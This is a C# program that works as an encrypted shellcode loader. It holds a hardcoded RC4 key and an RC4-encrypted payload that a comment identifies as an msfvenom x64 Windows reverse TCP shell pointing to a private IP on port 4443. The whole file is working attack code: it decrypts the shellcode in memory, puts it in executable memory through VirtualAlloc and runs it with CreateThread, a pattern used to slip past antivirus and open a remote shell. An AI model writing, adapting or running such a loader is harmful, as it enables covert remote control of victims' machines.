using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace payload_2rc4_loader_fullhardcoded
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Full hardcoded payload decryption tool");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();
            Console.WriteLine("[!] Using hardcoded RC4 key.");
            /// Text to Hex: 123123123123 = 31 32 33 31 32 33 31 32 33 31 32 33
            string Payload_Encrypted;
            byte[] xKey = { 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33 };
            /// msfvenom --platform windows -p windows/x64/shell/reverse_tcp lhost=192.168.237.129 lport=4443 -f csharp
            Payload_Encrypted = "175 184 60 102 21 156 200 251 37 99 66 219 63 75 242 224 5 196 232 243 7 50 212 4 150 179 11 237 65 198 73 160 250 123 163 200 148 88 54 115 198 95 33 32 63 127 76 188 66 207 8 179 210 202 16 114 73 26 49 163 195 164 251 234 131 139 81 203 159 14 184 196 75 52 202 135 49 13 84 104 176 170 158 251 120 166 179 138 67 221 166 5 214 42 82 105 83 68 198 248 245 99 76 45 167 123 108 47 23 133 63 102 228 242 157 39 77 210 33 117 175 227 7 51 96 238 171 149 170 46 165 109 49 166 209 34 36 211 32 91 161 174 57 254 38 198 51 101 122 67 31 240 55 91 141 121 234 21 56 130 88 85 48 173 104 224 64 174 25 20 36 251 64 5 68 36 59 221 140 73 167 215 210 233 104 243 25 12 221 108 64 104 25 110 216 152 135 64 16 99 92 77 222 251 249 104 180 240 50 169 118 113 215 135 155 246 251 69 212 37 19 21 127 150 0 71 37 5 10 1 105 45 191 84 224 125 160 231 73 230 170 116 22 152 204 179 234 88 237 67 49 85 113 36 92 110 98 124 110 20 71 230 45 91 163 71 57 148 117 22 7 12 99 43 39 73 212 247 29 69 250 141 23 72 130 171 131 247 232 131 20 231 38 94 121 143 232 176 122 109 141 140 200 84 179 81 101 12 47 177 115 129 234 104 133 15 97 215 72 191 182 220 26 107 171 77 96 30 252 212 201 217 139 49 31 41 237 131 26 36 163 190 167 233 91 10 9 186 38 226 10 254 13 201 34 45 196 126 24 180 58 250 221 222 156 119 170 38 36 149 67 186 186 217 216 120 158 17 159 6 7 162 31 14 228 81 80 72 204 15 13 50 49 209 147 225 1 219 237 112 236 37 147 225 55 37 104 217 128 132 38 31 177 71 106 225 228 195 164 244 9 126 245 13 141 251 227 11 178 201 216 56 19 159 49 132 201 111 248 97 148 57 74 109 252 177 95 199 51 57 69 246 55 6 43 131 43 44 90 165 90 52 10 228 30 108 180 217 190 31 204 208 228 216 1 119 123 43 94 67 165 109 151 154 131 111 104 15 253 145 42 42 229 119 158 199 249 42 182 27 224 88 118 9 83 125 178 130 250 153";
            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(' ');
            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            try
            {
                Console.WriteLine();
                Console.WriteLine("[!] Loading encrypted payload in Memory Done.");
                Console.ForegroundColor = ConsoleColor.Green;
                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);
                Console.WriteLine("[>] Decrypting `payload by KEY in Memory Done.");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("Reverse session done!");
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xffffffff);
            }
            catch (Exception)
            {
                throw;
            }
        }
        /// RC4 Decryption Section
        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }
        private static byte[] EncryptInitalize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
            .Select(i => (byte)i)
            .ToArray();
            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;
                Swap(s, i, j);
            }
            return s;
        }
        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);
            int i = 0;
            int j = 0;
            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;
                Swap(s, i, j);
                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
        }
        /// Windows API Importing Section
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags,
        ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
